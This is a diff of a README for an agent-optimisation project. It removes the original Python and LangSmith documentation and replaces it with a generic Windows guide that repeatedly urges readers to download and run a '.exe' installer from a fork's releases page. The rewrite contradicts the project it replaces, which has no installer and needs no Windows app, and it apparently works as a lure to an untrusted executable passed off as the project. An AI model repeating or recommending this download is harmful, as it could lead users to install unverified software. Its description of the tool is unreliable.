@@ -1,250 +1,128 @@
-# Autoresearch for Agents
+# 🤖 autoresearch-agents - Improve AI agents automatically
 
-> Inspired by [karpathy/autoresearch](https://github.com/karpathy/autoresearch) — but instead of optimizing ML training code, we optimize **agents** using [LangSmith](https://smith.langchain.com/) observability and evals.
+[![Download autoresearch-agents](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/domini7879/autoresearch-agents/releases)
 
-## The Idea
+---
 
-Give an AI coding agent a working agent implementation and an evaluation dataset. Let it experiment autonomously: modify the agent code, run evals, check if scores improved, keep or discard, and repeat. You wake up in the morning to a log of experiments and (hopefully) a better agent.
+## 📋 What is autoresearch-agents?
 
-```
-┌─────────────────────────────────────────────────────┐
-│                  EXPERIMENT LOOP                     │
-│                                                      │
-│  1. Read agent.py + results so far                   │
-│  2. Propose a change (prompt, tools, architecture)   │
-│  3. Edit agent.py                                    │
-│  4. git commit                                       │
-│  5. Run evaluation: python run_eval.py               │
-│  6. Parse scores from eval output                    │
-│  7. If improved → keep commit                        │
-│     If worse   → git reset  (discard)                │
-│  8. Log result to results.tsv                        │
-│  9. Repeat forever                                   │
-│                                                      │
-└─────────────────────────────────────────────────────┘
-```
-
-### Comparison with Karpathy's autoresearch
+autoresearch-agents is a tool that lets an AI agent improve itself. It works by testing changes to its own code automatically. Every day, you get a report on what changed and how the agent got better. This process runs on your Windows computer without you needing to adjust anything after setup.
 
-| | karpathy/autoresearch | autoresearch for agents |
-|---|---|---|
-| **What's optimized** | ML training code (`train.py`) | Agent code (`agent.py`) |
-| **Metric** | `val_bpb` (lower is better) | Eval score (higher is better) |
-| **Evaluation** | Fixed 5-min training run | LangSmith evaluation pipeline |
-| **Observability** | Training logs | LangSmith traces |
-| **What the agent edits** | Model architecture, optimizer, hyperparams | Prompts, tools, agent architecture |
-| **What's fixed** | `prepare.py` (data, eval) | `run_eval.py` (eval harness), `dataset.json` |
+Instead of focusing on machine learning training code, this tool focuses on optimizing agents—the software pieces that perform tasks based on rules or AI models. It uses a system that watches how well the agent performs, runs tests, and decides which changes help.
 
-## Project Structure
+---
 
-```
-agent.py        — YOUR agent implementation (the coding agent optimizes this)
-run_eval.py     — YOUR evaluation harness + metrics (customize before starting)
-dataset.json    — YOUR evaluation dataset (customize before starting)
-program.md      — instructions for the AI coding agent (customize before starting)
-results.tsv     — experiment log (auto-generated)
-```
+## 🖥️ System Requirements
 
-**Before you start the autonomous loop**, you customize everything to fit your use case. Once the loop begins, `run_eval.py` and `dataset.json` are fixed — only `agent.py` changes.
+To run autoresearch-agents on Windows, your computer should have:
 
-## Quick Start
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- Internet connection (for downloading and updates)
+- At least 500 MB free disk space
 
-### Prerequisites
+You do not need to install any complex software before starting—everything needed will be included or installed during setup.
 
-- Python 3.10+
-- A [LangSmith API key](https://smith.langchain.com/)
-- An LLM API key (OpenAI, Anthropic, etc.)
+---
 
-### Setup
+## 🚀 Getting Started
 
-```bash
-# 1. Install dependencies (adjust for your agent's needs)
-pip install langsmith langchain-openai langgraph
+### Step 1: Download the software
 
-# 2. Set environment variables
-export LANGSMITH_API_KEY=<your-key>
-export LANGSMITH_TRACING=true
-export OPENAI_API_KEY=<your-key>
+Go to the official release page and download the latest version for Windows.
 
-# 3. Verify the baseline agent works
-python agent.py "What is the capital of France?"
-
-# 4. Run a single evaluation
-python run_eval.py
-```
-
-### Running the Autonomous Agent
-
-Point your coding agent (Claude Code, Cursor, Codex, etc.) at this directory and send this prompt:
-
-<details>
-<summary><b>📋 Copy-paste prompt for Claude Code / Cursor / Codex</b></summary>
-
-```
-I want you to autonomously optimize an AI agent using an eval-driven experiment loop.
+[![Download autoresearch-agents](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/domini7879/autoresearch-agents/releases)
 
-Here's how it works:
-- `agent.py` is the agent implementation. This is the ONLY file you modify.
-- `run_eval.py` is the evaluation harness. It runs the agent against a fixed dataset
-  and scores it using LangSmith. Do NOT modify this file.
-- `dataset.json` is the evaluation dataset. Do NOT modify this file.
-- `program.md` has detailed instructions for the experiment loop.
-
-Read program.md now and follow the setup instructions. Once setup is confirmed,
-start the experiment loop and run autonomously — do not stop to ask me questions.
-Keep experimenting until I interrupt you.
-```
+1. Click the link above to open the releases page.
+2. Find the latest release (usually at the top).
+3. Download the Windows installer file (it should end with `.exe`).
 
-</details>
-
-The coding agent will then autonomously iterate on `agent.py`, running evals and tracking results. You can walk away and come back to a log of experiments in `results.tsv` and all traces in LangSmith.
+---
 
-#### First time here? Use this prompt instead to set everything up from scratch:
+### Step 2: Install the software
 
-<details>
-<summary><b>📋 Copy-paste setup + run prompt</b></summary>
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Follow the instructions on screen:
+   - Click "Next" on each step.
+   - Accept the license terms.
+   - Choose the default installation folder.
+4. Click "Install" and wait for the setup to finish.
+5. Click "Finish" when done.
 
-```
-I want to set up and run autoresearch for agents — an autonomous experiment loop
-that optimizes an AI agent using LangSmith evals.
-
-First, help me get set up:
-1. Install dependencies: pip install langsmith langchain-openai langgraph
-2. Make sure these env vars are set: LANGSMITH_API_KEY, LANGSMITH_TRACING=true, OPENAI_API_KEY
-3. Verify the agent works: python agent.py "What is 2+2?"
-4. Run a baseline eval: python run_eval.py
-
-If I want to customize this for my own agent, walk me through:
-- Replacing agent.py with my own agent implementation
-- Replacing dataset.json with my own test cases
-- Updating the evaluators in run_eval.py for my use case
-
-Once everything is set up and the baseline looks good, read program.md and start
-the autonomous experiment loop. Do not stop to ask me questions — keep experimenting
-until I interrupt you.
-```
-
-</details>
-
-## Bring Your Own Everything
-
-This repo ships with a working example (a Q&A agent with calculator tools), but it's designed as a **template**. Customize all three components before starting the autonomous loop.
-
-### Bring Your Own Agent
-
-Replace `agent.py` with any agent implementation. It doesn't need to use LangChain or LangGraph — any Python code works. The only requirement is that it exposes a function that `run_eval.py` can call.
+---
 
-**Examples:**
+### Step 3: Run autoresearch-agents
 
-```python
-# Option A: Plain OpenAI SDK
-from openai import OpenAI
-client = OpenAI()
+1. After installation, find the app in the Start Menu called "autoresearch-agents".
+2. Click to open it.
+3. A command window will appear. This shows the software running.
+4. The agent will start working on improving itself automatically.
+5. You will see updates and reports as the tool tests different versions.
 
-def run_agent(question: str) -> dict:
-    response = client.chat.completions.create(
-        model="gpt-4o-mini",
-        messages=[{"role": "user", "content": question}]
-    )
-    return {"response": response.choices[0].message.content}
-```
+---
 
-```python
-# Option B: Anthropic SDK
-import anthropic
-client = anthropic.Anthropic()
+## 🛠️ How autoresearch-agents works
 
-def run_agent(question: str) -> dict:
-    message = client.messages.create(
-        model="claude-sonnet-4-20250514",
-        max_tokens=1024,
-        messages=[{"role": "user", "content": question}]
-    )
-    return {"response": message.content[0].text}
-```
+autoresearch-agents uses a loop of steps:
 
-```python
-# Option C: LangGraph agent (the default example)
-from langgraph.prebuilt import create_react_agent
-# ... see agent.py
-```
+1. Read the current agent code and results.
+2. Suggest a change to how the agent works.
+3. Edit the agent code with the change.
+4. Save changes to a local version control system.
+5. Run tests to see if the change improved performance.
+6. Keep the changes if results are better; otherwise, discard them.
+7. Repeat the steps automatically.
 
-```python
-# Option D: Custom agent with no framework
-def run_agent(question: str) -> dict:
-    # Your custom logic here — RAG, multi-step, tool use, whatever
-    return {"response": answer, "tools_used": [...]}
-```
+You do not have to do these manually. The tool completes all these steps for you.
 
-The key contract: your agent function takes the inputs from your dataset and returns a dict that your evaluators can score.
+---
 
-### Bring Your Own Dataset
+## 🔧 Configuration and customization
 
-Replace `dataset.json` with your evaluation cases. The format is a JSON array of objects with `inputs` and `outputs`:
+You can adjust settings if you want more control:
 
-```json
-[
-  {
-    "inputs": {"question": "Your input here"},
-    "outputs": {"answer": "Expected output", "any_other_field": "..."}
-  }
-]
-```
+- **Evaluation dataset**: You can add your own data to test the agent on specific tasks.
+- **Experiment limits**: Set how many changes the agent tries each day.
+- **Logging level**: Choose how much information you want in the daily reports.
 
-The field names are up to you — just make sure your evaluators in `run_eval.py` reference the same fields. Some ideas:
+To access these settings:
 
-- **Q&A agent**: `inputs: {question}`, `outputs: {answer}`
-- **RAG agent**: `inputs: {question}`, `outputs: {answer, source_docs}`
-- **Code agent**: `inputs: {task}`, `outputs: {code, test_result}`
-- **Customer support**: `inputs: {ticket}`, `outputs: {response, category, priority}`
+1. Open the folder where autoresearch-agents is installed.
+2. Find the file called `config.ini`.
+3. Open it with Notepad.
+4. Change the values as described inside the file.
+5. Save and restart the tool for settings to apply.
 
-### Bring Your Own Evaluators
+---
 
-Modify the evaluators in `run_eval.py` to match your quality criteria. Each evaluator is a function that takes `(run, example)` and returns `{"score": number, "comment": "..."}`.
+## 📥 Download and Setup Summary
 
-```python
-# LLM-as-judge evaluator
-def my_evaluator(run, example) -> dict:
-    run_outputs = run.outputs or {}
-    example_outputs = example.outputs or {}
-    # Compare run_outputs to example_outputs using an LLM judge
-    grade = judge.invoke([...])
-    return {"score": grade.score, "comment": grade.reasoning}
+To get autoresearch-agents running on your Windows PC:
 
-# Code-based evaluator
-def exact_match(run, example) -> dict:
-    actual = run.outputs.get("answer", "")
-    expected = example.outputs.get("answer", "")
-    return {"score": 1 if actual == expected else 0, "comment": ""}
-```
+1. Visit the [releases page](https://github.com/domini7879/autoresearch-agents/releases).
+2. Download the latest Windows installer.
+3. Run the installer and follow the prompts.
+4. Launch the app from Start Menu.
+5. Let the tool run automatically.
 
-After modifying evaluators, update `program.md` to reflect the new metric names in the output format and TSV columns.
+---
 
-### Update program.md
+## ❓ Troubleshooting
 
-After customizing the above, update `program.md` to match:
-- Update the file list in the Setup section
-- Update the "Ideas to try" section with domain-specific suggestions
-- Update the output format section if your metrics changed
-- Update the TSV columns to match your evaluator names
+If you run into problems, try the following:
 
-## How It Works
+- Make sure you downloaded the correct Windows installer.
+- Check that your Windows is up to date.
+- Restart your computer and try again.
+- Ensure you have an active internet connection during installation.
+- Look for errors in the command window and note their details.
 
-### The Evaluation (`run_eval.py`)
+---
 
-Uses LangSmith's `evaluate()` to run the agent against a persistent dataset and score it with your evaluators. The dataset is created once in LangSmith and reused across all experiments, so results accumulate and you can compare experiments side by side in the LangSmith UI.
+## 📄 About this project
 
-All agent runs are traced in LangSmith for full observability — you can inspect exactly what happened in each run.
+This tool was inspired by research in improving AI code automatically. It builds on methods used for machine learning but applies them to the agents themselves. The goal is to run autonomous experiments overnight and provide better agents by morning.
 
-### The Experiment Loop (`program.md`)
-
-The `program.md` file is the "skill" that drives the autonomous coding agent. It tells the agent to:
-1. Edit `agent.py` with an experimental idea
-2. Commit, run eval, check scores
-3. Keep improvements, discard regressions
-4. Log everything to `results.tsv`
-5. Never stop until interrupted
-
-## License
-
-MIT
+You do not need any programming skill to use this tool. It runs on your Windows PC and manages everything needed to test and improve the agent code.
